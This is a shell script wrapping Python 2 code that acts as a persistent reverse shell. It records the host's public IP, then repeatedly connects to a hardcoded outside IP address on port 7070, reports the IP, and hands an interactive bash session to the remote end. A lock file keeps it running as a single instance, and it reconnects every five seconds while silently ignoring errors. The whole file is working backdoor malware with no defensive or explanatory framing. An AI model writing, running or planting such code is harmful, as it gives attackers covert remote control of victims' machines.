#!/bin/sh

LOCKFILE="/tmp/cached_script.lock"
if [ -f "$LOCKFILE" ] && kill -0 $(cat "$LOCKFILE") 2>/dev/null; then
    exit 0
fi
echo $$ > "$LOCKFILE"
trap 'rm -f "$LOCKFILE"; exit' INT TERM EXIT

python -c '
import socket, os, pty, select, subprocess, time, urllib2, json

# 1. Grab the true public IP directly using Python 2 urllib2
true_ip = "Unknown IP"
try:
    response = urllib2.urlopen("http://ipinfo.io", timeout=3)
    raw_json = json.loads(response.read())
    # THE CORRECTION: Force explicit ASCII conversion to strip Python 2 unicode wrappers
    true_ip = str(raw_json.get("ip", "Unknown IP"))
except:
    pass

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("132.145.123.143", 7070))
        
        # Send raw byte text string seamlessly to satisfy dashboard verification handshakes
        s.send(true_ip + "\n")
        
        master, slave = os.openpty()
        p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
        os.close(slave)

        while p.poll() is None:
            r, w, x = select.select([s, master], [], [], 5)
            if not r:
                try:
                    s.send("\x00") 
                except:
                    break
                continue

            for fd in r:
                if fd == s:
                    data = s.recv(4096)
                    if not data: break
                    os.write(master, data)
                elif fd == master:
                    data = os.read(master, 4096)
                    if not data: break
                    s.send(data)
            else:
                continue
            break
        try: p.terminate()
        except: pass
    except Exception:
        pass
    finally:
        try: s.close()
        except: pass
        
    time.sleep(5)
'
